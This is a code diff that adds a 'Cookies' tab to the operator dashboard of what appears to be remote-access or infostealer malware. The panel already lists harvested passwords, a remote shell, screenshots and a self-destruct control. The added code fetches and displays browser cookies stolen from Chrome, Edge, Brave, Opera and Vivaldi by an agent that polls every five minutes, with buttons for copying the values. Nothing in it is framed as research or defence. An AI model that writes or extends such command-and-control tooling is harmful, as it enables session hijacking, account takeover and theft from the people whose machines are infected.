@@ -94,6 +94,7 @@
       <button class="tab-btn" onclick="switchTab('triggers', this)">Triggers</button>
       <button class="tab-btn" onclick="switchTab('shell', this)">Shell</button>
       <button class="tab-btn" onclick="switchTab('passwords', this)">Passwords</button>
+      <button class="tab-btn" onclick="switchTab('cookies', this)">Cookies</button>
     </div>
 
     <main id="tabActivity" class="tab-content active border border-slate-800 bg-slate-900/20 rounded-xl overflow-hidden shadow-2xl">
@@ -205,6 +206,28 @@
           </thead>
           <tbody id="passwordsBody" class="text-sm divide-y divide-slate-800/50">
             <tr><td class="py-8 px-4 text-center text-slate-500" colspan="6">No passwords harvested yet</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </main>
+
+    <main id="tabCookies" class="tab-content border border-slate-800 bg-slate-900/20 rounded-xl overflow-hidden shadow-2xl p-5">
+      <h2 class="text-lg font-semibold text-slate-300 mb-4">Browser Cookies</h2>
+      <p class="text-xs text-slate-500 mb-4">Harvested cookies from Chrome, Edge, Brave, Opera, and Vivaldi. Agent polls every 5 minutes. Values are base64-encoded — copy and decode with <span class="mono-log text-amber-400">[Convert]::FromBase64String()</span> or any base64 tool.</p>
+      <div class="overflow-x-auto">
+        <table class="w-full text-left border-collapse">
+          <thead>
+            <tr class="bg-slate-900/80 border-b border-slate-800 text-xs font-semibold text-slate-400 uppercase tracking-wider">
+              <th class="py-3 px-4 w-52">Time</th>
+              <th class="py-3 px-4 w-32">Host</th>
+              <th class="py-3 px-4 w-20">Browser</th>
+              <th class="py-3 px-4 w-72">Domain</th>
+              <th class="py-3 px-4 w-48">Name</th>
+              <th class="py-3 px-4">Value (base64)</th>
+            </tr>
+          </thead>
+          <tbody id="cookiesBody" class="text-sm divide-y divide-slate-800/50">
+            <tr><td class="py-8 px-4 text-center text-slate-500" colspan="6">No cookies harvested yet<br><span class="text-xs text-slate-600">Agent will check browsers every 5 minutes &mdash; results appear here</span></td></tr>
           </tbody>
         </table>
       </div>
@@ -461,10 +484,12 @@ function switchTab(tab, btn) {
   document.getElementById('tabTriggers').classList.toggle('active', tab === 'triggers');
   document.getElementById('tabShell').classList.toggle('active', tab === 'shell');
   document.getElementById('tabPasswords').classList.toggle('active', tab === 'passwords');
+  document.getElementById('tabCookies').classList.toggle('active', tab === 'cookies');
   if (tab === 'screenshots') fetchScreenshots();
   if (tab === 'triggers') fetchTriggers();
   if (tab === 'shell') fetchExecResults();
   if (tab === 'passwords') fetchPasswords();
+  if (tab === 'cookies') fetchCookies();
 }
 
 async function fetchHeartbeat() {
@@ -720,6 +745,40 @@ async function fetchPasswords() {
   } catch (e) {}
 }
 
+async function fetchCookies() {
+  try {
+    const res = await fetch(PROXY_URL + '?path=' + encodeURIComponent('/rest/v1/cookies?select=id,created_at,hostname,browser,domain,name,value&order=created_at.desc&limit=200'));
+    if (!res.ok) return;
+    const data = await res.json();
+    const tbody = document.getElementById('cookiesBody');
+    if (!data || data.length === 0) {
+      tbody.innerHTML = '<tr><td class="py-8 px-4 text-center text-slate-500" colspan="6">No cookies harvested yet<br><span class="text-xs text-slate-600">Agent will check browsers every 5 minutes &mdash; results appear here</span></td></tr>';
+      return;
+    }
+    tbody.innerHTML = data.map(row => {
+      const ts = row.created_at ? new Date(row.created_at.replace(/Z$|[+\-]\d{2}:?\d{2}$/, '') + 'Z').toLocaleString() : '-';
+      const host = row.hostname || '-';
+      const browser = row.browser || '-';
+      const domain = row.domain || '';
+      const name = row.name || '';
+      const val = row.value || '';
+      const isHarvest = domain === '[HARVEST]';
+      return '<tr class="hover:bg-slate-800/30 transition-colors">'
+        + '<td class="py-3 px-4 text-slate-400 whitespace-nowrap text-xs">' + ts + '</td>'
+        + '<td class="py-3 px-4 text-emerald-400 font-medium text-xs">' + escapeHtml(displayHost(host)) + '</td>'
+        + '<td class="py-3 px-4"><span class="px-1.5 py-0.5 text-xs rounded bg-slate-800 text-slate-400 border border-slate-700">' + escapeHtml(browser) + '</span></td>'
+        + '<td class="py-3 px-4 text-xs break-all max-w-[300px]' + (isHarvest ? ' text-amber-400/60 italic' : ' text-slate-200') + '">' + escapeHtml(domain) + '</td>'
+        + '<td class="py-3 px-4 text-xs text-slate-300 mono-log break-all max-w-[200px]">' + escapeHtml(name) + '</td>'
+        + '<td class="py-3 px-4 text-xs">'
+        + (isHarvest
+            ? '<span class="text-slate-500 text-xs">' + escapeHtml(val) + '</span>'
+            : '<button class="px-2 py-1 text-xs rounded bg-slate-800 hover:bg-slate-700 text-slate-400 border border-slate-700 transition" onclick="navigator.clipboard.writeText(this.dataset.val).then(()=>{this.textContent=\'Copied!\';setTimeout(()=>{this.textContent=\'Copy\'},1500)})" data-val="' + escapeHtml(val) + '">Copy</button>')
+        + '</td>'
+        + '</tr>';
+    }).join('');
+  } catch (e) {}
+}
+
 document.getElementById('stopBtn').addEventListener('click', sendStop);
 document.getElementById('destructBtn').addEventListener('click', sendDestruct);
 
@@ -744,6 +803,7 @@ window.addEventListener('DOMContentLoaded', () => {
     else if (currentTab === 'triggers') fetchTriggers();
     else if (currentTab === 'shell') fetchExecResults();
     else if (currentTab === 'passwords') fetchPasswords();
+    else if (currentTab === 'cookies') fetchCookies();
   }, 20000);
   setInterval(tick, 1000);
 });
